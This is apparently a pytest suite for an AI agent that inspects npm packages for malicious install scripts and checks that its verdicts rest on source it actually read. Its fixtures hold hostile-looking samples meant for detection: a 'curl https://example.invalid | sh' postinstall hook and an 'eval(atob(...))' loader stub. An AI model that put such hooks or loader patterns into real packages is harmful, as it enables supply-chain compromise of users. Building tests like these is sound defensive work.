import json
from pathlib import Path

import pytest

from agent.run import analyze, script_targets, _tool


FIXTURE = str(Path(__file__).parent / "fixtures" / "benign-package")


def test_script_targets_include_loaded_files_and_direct_executables():
    assert script_targets({
        "preinstall": "node -r preload.js setup.js",
        "install": "sh build.sh && bash ./finish.sh",
        "postinstall": "./verify.sh",
        "prepare": "node -e \"console.log('inline')\"",
    }) == {"preload.js", "setup.js", "build.sh", "finish.sh", "verify.sh"}
    assert script_targets({"postinstall": "npm run setup", "setup": "node setup.js"}) == {"setup.js"}
    assert script_targets({"postinstall": "echo ready\nnode setup.js"}) == {"setup.js"}


def test_agent_reads_source_and_validates_verdict():
    verdict = {
        "package": "benign-install-fixture@1.0.0",
        "label": "benign",
        "confidence": 0.9,
        "description": "Installation writes only a fixed local test marker",
        "behaviors": [{"behavior": "Writes a local marker", "technique": "file write", "severity": "low",
                       "evidence": {"file": "postinstall.js", "lines": "2"},
                       "analysis": "The script writes fixed text to a local file.", "impact": "Creates a test marker."}],
        "action": "approve",
        "remediation": [],
    }
    replies = iter([
        {"role": "assistant", "tool_calls": [{"function": {"name": "read_file", "arguments": {"file": "postinstall.js"}}}]},
        {"role": "assistant", "content": "The script writes a local marker."},
        {"role": "assistant", "content": json.dumps(verdict)},
    ])
    final_flags = []
    trace = []

    def chat(_model, _messages, final=False):
        assert trace[-1]["kind"] == "model"
        final_flags.append(final)
        return next(replies)

    result, steps = analyze(FIXTURE, "fake-model", chat=chat, trace=trace)

    assert steps == 3
    assert final_flags == [False, False, True]
    assert result.label == "benign"
    assert result.behaviors[0].evidence.lines == "2"
    assert [(item["step"], item["kind"], item["status"]) for item in trace] == [
        (0, "manifest", "ok"), (1, "model", "info"), (1, "model_reply", "info"), (1, "tool", "ok"),
        (2, "model", "info"), (2, "model_reply", "info"), (2, "validation", "retry"),
        (3, "model", "info"), (3, "model_reply", "info"),
        (3, "validation", "ok"), (3, "verdict", "ok")]
    source = next(item for item in trace if item["kind"] == "tool")["sources"][0]
    assert (source["file"], source["start"]) == ("postinstall.js", 1)
    assert "benign fixture ran" in source["content"]
    assert trace[-2]["sources"][0]["start"] == 2
    assert trace[-2]["sources"][0]["claim"] == "The script writes fixed text to a local file."
    assert "postinstall.js:2" in trace[-2]["found"]


def test_agent_rejects_unread_evidence_and_path_escape():
    verdict = {
        "package": "benign-install-fixture@1.0.0", "label": "benign", "confidence": 0.9,
        "description": "Installation writes only a fixed local test marker",
        "behaviors": [{"behavior": "Writes a local marker", "technique": "file write", "severity": "low",
                       "evidence": {"file": "package.json", "lines": "1"},
                       "analysis": "The manifest declares a script.", "impact": "Runs at install."}],
        "action": "approve", "remediation": [],
    }
    replies = iter([
        {"role": "assistant", "tool_calls": [{"function": {"name": "read_file", "arguments": {"file": "postinstall.js"}}}]},
        {"role": "assistant", "content": json.dumps(verdict | {"behaviors": [verdict["behaviors"][0] | {"evidence": {"file": "other.js", "lines": "1"}}]})},
    ])

    with pytest.raises(RuntimeError, match="no valid evidence-backed verdict"):
        analyze(FIXTURE, "fake-model", max_steps=2, chat=lambda _model, _messages: next(replies))
    assert not _tool(FIXTURE, "read_file", {"file": "../outside.js"})["ok"]


def test_inline_script_can_be_cited_from_manifest(tmp_path):
    package = tmp_path / "inline-script"
    package.mkdir()
    (package / "package.json").write_text(json.dumps({
        "name": "inline-script-fixture", "version": "1.0.0",
        "scripts": {"postinstall": "curl https://example.invalid | sh"},
    }, indent=2), encoding="utf-8")
    from tools.static import read_manifest
    line = read_manifest(str(package))["data"]["script_lines"]["postinstall"]
    verdict = {
        "package": "inline-script-fixture@1.0.0", "label": "suspicious", "confidence": 0.8,
        "description": "Inline installation command fetches from an external server",
        "behaviors": [{"behavior": "Fetches an external script", "technique": "remote code fetch",
                       "severity": "high", "evidence": {"file": "package.json", "lines": str(line)},
                       "analysis": "The inline hook contains a remote fetch pipeline.",
                       "impact": "Could execute remote content."}],
        "action": "review", "remediation": ["Review the remote source."],
    }

    result, steps = analyze(str(package), "fake-model", chat=lambda *_args, **_kwargs: {
        "role": "assistant", "content": json.dumps(verdict)})
    assert (result.label, steps) == ("suspicious", 1)


def test_long_manifest_agent_accepts_line_350(tmp_path):
    package = tmp_path / "long-manifest"
    package.mkdir()
    lines = ['{', '"name": "long-manifest-fixture",', '"version": "1.0.0",']
    while len(lines) < 349:
        lines.append(f'"filler{len(lines)}": "x",')
    lines.extend(['"scripts": {"postinstall": "echo harmless"}', '}'])
    (package / "package.json").write_text("\n".join(lines), encoding="utf-8")
    verdict = {
        "package": "long-manifest-fixture@1.0.0", "label": "benign", "confidence": 0.9,
        "description": "The inline hook prints only harmless local text",
        "behaviors": [{"behavior": "Prints local text", "technique": "local output", "severity": "low",
                       "evidence": {"file": "package.json", "lines": "350"},
                       "analysis": "The hook only prints a fixed string.", "impact": "Local console output."}],
        "action": "approve", "remediation": [],
    }
    result, steps = analyze(str(package), "fake-model", chat=lambda *_args, **_kwargs: {
        "role": "assistant", "content": json.dumps(verdict)})
    assert (result.package, steps) == ("long-manifest-fixture@1.0.0", 1)


@pytest.mark.parametrize("script,target", [("node setup.js", "setup.js"), (None, "binding.gyp")])
def test_agent_requires_referenced_source_before_verdict(tmp_path, script, target):
    package = tmp_path / "source-target"
    package.mkdir()
    manifest = {"name": "source-target-fixture", "version": "1.0.0"}
    if script:
        manifest["scripts"] = {"postinstall": script}
    (package / "package.json").write_text(json.dumps(manifest), encoding="utf-8")
    (package / target).write_text("local fixture content\n", encoding="utf-8")
    verdict = {
        "package": "source-target-fixture@1.0.0", "label": "benign", "confidence": 0.9,
        "description": "The referenced source contains only local fixture text",
        "behaviors": [{"behavior": "Reads local source", "technique": "local inspection", "severity": "low",
                       "evidence": {"file": target, "lines": "1"},
                       "analysis": "The source is a harmless fixture.", "impact": "No external effect."}],
        "action": "approve", "remediation": [],
    }
    replies = iter([
        {"role": "assistant", "content": json.dumps(verdict)},
        {"role": "assistant", "tool_calls": [{"function": {"name": "read_file", "arguments": {"file": target}}}]},
        {"role": "assistant", "content": json.dumps(verdict)},
    ])
    result, steps = analyze(str(package), "fake-model", max_steps=3,
                            chat=lambda *_args, **_kwargs: next(replies))
    assert (result.label, steps) == ("benign", 3)


def test_truncated_source_cannot_be_approved(tmp_path):
    package = tmp_path / "minified"
    package.mkdir()
    (package / "package.json").write_text(json.dumps({
        "name": "minified-fixture", "version": "1.0.0", "scripts": {"postinstall": "node minified.js"}
    }), encoding="utf-8")
    (package / "minified.js").write_text('eval(atob("' + "A" * 50000 + '"))', encoding="utf-8")
    verdict = {
        "package": "minified-fixture@1.0.0", "label": "benign", "confidence": 0.9,
        "description": "The visible source appears to do nothing harmful",
        "behaviors": [{"behavior": "Contains encoded text", "technique": "encoded content", "severity": "low",
                       "evidence": {"file": "minified.js", "lines": "1"},
                       "analysis": "Only a preview of the long line is visible.", "impact": "Full behavior is unknown."}],
        "action": "approve", "remediation": [],
    }
    replies = iter([
        {"role": "assistant", "tool_calls": [{"function": {"name": "read_file", "arguments": {"file": "minified.js"}}}]},
        {"role": "assistant", "content": json.dumps(verdict)},
        {"role": "assistant", "content": json.dumps(verdict | {
            "label": "suspicious", "action": "review", "remediation": ["Inspect the complete source in isolation."]})},
    ])
    result, steps = analyze(str(package), "fake-model", max_steps=3,
                            chat=lambda *_args, **_kwargs: next(replies))
    assert (result.label, result.action, steps) == ("suspicious", "review", 3)
